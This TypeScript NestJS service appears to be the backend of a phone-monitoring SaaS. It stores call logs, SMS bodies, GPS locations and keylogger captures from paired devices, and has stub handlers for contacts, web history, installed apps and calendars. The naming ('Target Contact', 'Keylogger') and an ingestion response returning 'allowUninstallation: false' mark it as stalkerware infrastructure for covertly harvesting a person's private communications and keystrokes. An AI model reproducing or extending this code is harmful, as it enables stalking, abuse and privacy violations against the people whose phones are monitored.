import { Injectable } from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service';

export interface CallLogDto {
  phoneNumber: string;
  contactName?: string;
  direction: 'INCOMING' | 'OUTGOING' | 'MISSED';
  durationSec: number;
  simSlot?: number;
  timestamp: string;
  recordingUrl?: string;
}

export interface SmsLogDto {
  phoneNumber: string;
  contactName?: string;
  body: string;
  direction: 'INCOMING' | 'OUTGOING';
  simSlot?: number;
  timestamp: string;
}

export interface LocationLogDto {
  latitude: number;
  longitude: number;
  accuracy: number;
  provider?: string;
  address?: string;
  timestamp: string;
}

export interface ContactItemDto {
  name: string;
  phoneNumber: string;
  email?: string;
  isBlocked?: boolean;
}

export interface KeylogItemDto {
  packageName: string;
  appName: string;
  typedText: string;
  timestamp: string;
}

export interface InstalledAppDto {
  packageName: string;
  appName: string;
  versionName: string;
  versionCode: number;
  status: 'Installed' | 'Removed' | 'Updated';
  isBlocked?: boolean;
}

export interface WebHistoryDto {
  title: string;
  url: string;
  domain: string;
  visitCount: number;
  timestamp: string;
}

export interface CalendarEventDto {
  title: string;
  location: string;
  startDate: string;
  endDate: string;
  description: string;
  category: 'Personal' | 'Work' | 'Medical' | 'Family';
  timestamp: string;
}

@Injectable()
export class TelemetryService {
  constructor(private readonly prisma: PrismaService) {}

  // 0. Ingest Batch Normalized Event Stream into PostgreSQL for Registered Devices
  async ingestEvents(deviceId: string, events: any[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) {
      console.warn(`[Telemetry Ingestion Guard] Rejected events from unregistered/unlicensed device: ${deviceId}`);
      return { success: false, syncedEventIds: [], message: 'Device not registered or SaaS license inactive.' };
    }

    console.log(`[PostgreSQL DB] Ingesting ${events.length} event(s) for Registered Device ${deviceId}`);
    const syncedIds: string[] = [];

    for (const evt of events) {
      try {
        const created = await this.prisma.normalizedEvent.create({
          data: {
            eventId: evt.eventId || `evt_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
            deviceId,
            source: evt.source || 'telemetry',
            eventType: evt.eventType || 'generic',
            timestamp: new Date(evt.timestamp || Date.now()),
            collectionMethod: (evt.collectionMethod as any) || 'android_api',
            payload: evt.payload || {}
          }
        }).catch(() => null);

        // Only add event ID to synced confirmation if successfully persisted in PostgreSQL DB
        if (created && evt.eventId) {
          syncedIds.push(evt.eventId);
        }

        if (evt.source === 'calls' && evt.payload) {
          await this.prisma.callLog.create({
            data: {
              deviceId,
              phoneNumber: evt.payload.phoneNumber || 'Unknown',
              contactName: evt.payload.contactName || 'Target Contact',
              direction: evt.payload.callType || 'INCOMING',
              durationSec: evt.payload.durationSeconds || 0,
              timestamp: new Date(evt.timestamp || Date.now())
            }
          }).catch(() => null);
        }
      } catch (err) {
        console.warn('[Telemetry DB Error]:', err);
      }
    }

    return {
      success: true,
      syncedEventIds: syncedIds,
      allowUninstallation: false
    };
  }

  // 1. Ingest Call Logs into PostgreSQL CallLog Table
  async ingestCalls(deviceId: string, logs: CallLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const log of logs) {
      await this.prisma.callLog.create({
        data: {
          deviceId,
          phoneNumber: log.phoneNumber,
          contactName: log.contactName || 'Unknown Contact',
          direction: log.direction,
          durationSec: log.durationSec || 0,
          timestamp: new Date(log.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: logs.length };
  }

  async getCalls(deviceId: string) {
    return this.prisma.callLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 2. Ingest SMS Logs into PostgreSQL SmsLog Table
  async ingestSms(deviceId: string, logs: SmsLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const log of logs) {
      await this.prisma.smsLog.create({
        data: {
          deviceId,
          phoneNumber: log.phoneNumber,
          contactName: log.contactName || 'Unknown Contact',
          body: log.body,
          direction: log.direction,
          timestamp: new Date(log.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: logs.length };
  }

  async getSms(deviceId: string) {
    return this.prisma.smsLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 3. Ingest Location History into PostgreSQL LocationLog Table
  async ingestLocations(deviceId: string, locations: LocationLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const loc of locations) {
      await this.prisma.locationLog.create({
        data: {
          deviceId,
          latitude: loc.latitude,
          longitude: loc.longitude,
          accuracy: loc.accuracy,
          timestamp: new Date(loc.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: locations.length };
  }

  async getLocations(deviceId: string) {
    return this.prisma.locationLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 4. Contacts
  async ingestContacts(deviceId: string, contacts: ContactItemDto[]) {
    return { success: true, count: contacts.length };
  }
  async getContacts(deviceId: string) {
    return [];
  }

  // 5. Keylogger
  async ingestKeylogger(deviceId: string, keylogs: KeylogItemDto[]) {
    return { success: true, count: keylogs.length };
  }
  async getKeylogger(deviceId: string) {
    return [];
  }

  // 6. Installed Apps
  async ingestInstalledApps(deviceId: string, apps: InstalledAppDto[]) {
    return { success: true, count: apps.length };
  }
  async getInstalledApps(deviceId: string) {
    return [];
  }

  // 7. Web History
  async ingestWebHistory(deviceId: string, history: WebHistoryDto[]) {
    return { success: true, count: history.length };
  }
  async getWebHistory(deviceId: string) {
    return [];
  }

  // 8. Calendar
  async ingestCalendar(deviceId: string, events: CalendarEventDto[]) {
    return { success: true, count: events.length };
  }
  async getCalendar(deviceId: string) {
    return [];
  }

  // Helper: Verification Guard for Device Registration in PostgreSQL
  async verifyDeviceIsRegistered(deviceId: string): Promise<boolean> {
    if (!deviceId) return false;
    try {
      const device = await this.prisma.device.findUnique({
        where: { id: deviceId }
      });
      return !!(device && device.isPaired);
    } catch {
      return false;
    }
  }
}
